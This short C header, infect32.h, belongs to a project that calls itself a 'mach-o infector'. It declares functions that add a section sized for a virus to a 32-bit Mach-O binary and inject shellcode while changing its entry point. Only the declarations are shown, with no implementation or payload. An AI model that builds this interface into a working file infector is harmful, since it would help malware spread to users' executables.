//
//  infect32.h
//  mach-o infector
//
//  Created by Pest on 27.11.14.
//  Copyright (c) 2014 coru.ws. All rights reserved.
//

#ifndef __my__infect32__
#define __my__infect32__

typedef unsigned char uint8;
typedef unsigned short uint16;
typedef unsigned int uint32;


bool add_section32(uint8 *buf,uint32 size,uint32 sizevirus,uint32 &padding,uint32 &oep,uint32 &vep);
bool infect32(uint8 *&buf,uint32 &size,uint8 *shell,uint32 lshell);
#endif /* defined(__my__infect32__) */
